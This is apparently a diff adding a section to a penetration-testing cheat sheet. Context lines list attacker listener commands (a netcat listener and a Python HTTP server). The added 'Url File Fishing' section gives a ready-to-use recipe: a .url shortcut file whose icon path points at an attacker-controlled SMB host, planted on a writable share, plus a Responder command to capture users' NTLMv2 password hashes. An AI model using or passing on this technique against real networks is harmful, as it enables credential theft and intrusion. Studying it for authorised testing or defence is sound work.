@@ -63,3 +63,16 @@ know!
 Lhost: nc -nlvp 4444
 Lhost: python3 -m http.server
 ```
+### Url File Fishing
+```
+1. Create file called "@hax.url" with following content:
+[InternetShortcut]
+URL=anything
+WorkingDirectory=anything
+IconFile=\\192.168.45.188(kali ip)\%USERNAME%.icon
+IconIndex=1
+
+2. if SMB share has write permission, upload @hax.url onto smb share
+3. sudo responder -I tun0 -Av
+Then you get ntlmv2 hash
+```
